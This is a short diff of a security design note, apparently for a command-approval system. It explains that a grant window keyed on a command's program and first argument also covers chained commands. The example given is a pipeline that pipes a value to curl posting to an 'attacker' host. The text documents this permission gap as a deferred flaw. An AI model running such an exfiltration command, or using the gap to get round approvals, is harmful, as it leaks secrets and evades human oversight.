@@ -590,7 +590,7 @@ helper matches.
 
 ### Deferred by the owner: the shape stops at the first metacharacter
 
-`operationShape` takes the program and its first argument, so a shell pipeline collapses to its
+The display shape takes the program and its first argument, so a shell pipeline collapses to its
 head. `printf %s "$V" | sha256sum` and `printf %s "$V" | curl -d @- https://attacker` are both
 `printf %s`, and a window granted for one covers the other on the same entry and session. A
 semicolon does the same. This is the case R4 says must not happen, that a grant for `ssh
